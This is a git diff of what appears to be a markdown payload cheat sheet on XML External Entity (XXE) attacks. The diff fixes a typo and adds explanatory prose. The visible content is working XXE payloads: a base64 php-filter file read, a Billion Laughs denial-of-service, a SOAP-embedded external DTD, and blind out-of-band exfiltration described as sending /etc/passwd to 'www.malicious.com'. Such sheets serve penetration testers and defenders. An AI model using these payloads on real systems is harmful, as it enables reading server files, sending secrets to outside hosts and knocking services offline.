@@ -1,10 +1,11 @@
 # XML External Entity
 
-An XML External Entity attack is a type of attack against an application that parses XML input
+An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities.
+XML entities can be used to tell the XML parser to fetch specific content on the server.
 
 ## Exploit
 
-Basic Test
+Basic XML external entity test, the result should contain "John" in `firstName` and "Doe" in `lastName`.
 
 ```xml
 <!--?xml version="1.0" ?-->
@@ -67,14 +68,16 @@ Classic XXE Base64 encoded
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
 <!ELEMENT foo ANY >
-<!ENTITY % xxe SYSTEM "php://filter/convert.bae64-encode/resource=http://10.0.0.3" >
+<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
 ]>
 <foo>&xxe;</foo>
 ```
 
 ## Deny of service
 
-Deny Of Service - Billion Laugh Attack
+**Warning** : These attacks will disable the service or the server, do not use them on the Prod.
+
+Billion Laugh Attack
 
 ```xml
 <!DOCTYPE data [
@@ -103,7 +106,11 @@ i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
 
 ## Blind XXE - Out of Band
 
+Sometimes you won't have a result outputted in the page but you can still extract the data with an out of band attack.
+
 ### Blind XXE
+
+Send the content of `/etc/passwd` to "www.malicious.com", you may receive only the first line.
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -146,13 +153,17 @@ File stored on http://127.0.0.1/dtd.xml
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
 ```
 
-### XXE Inside SOAP
+### XXE inside SOAP
 
 ```xml
-<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
+<soap:Body>
+  <foo>
+    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
+  </foo>
+</soap:Body>
 ```
 
-### XXE Inside DOCX file
+### XXE inside DOCX file
 
 Format of an Open XML file (inject the payload in any .xml file):
 
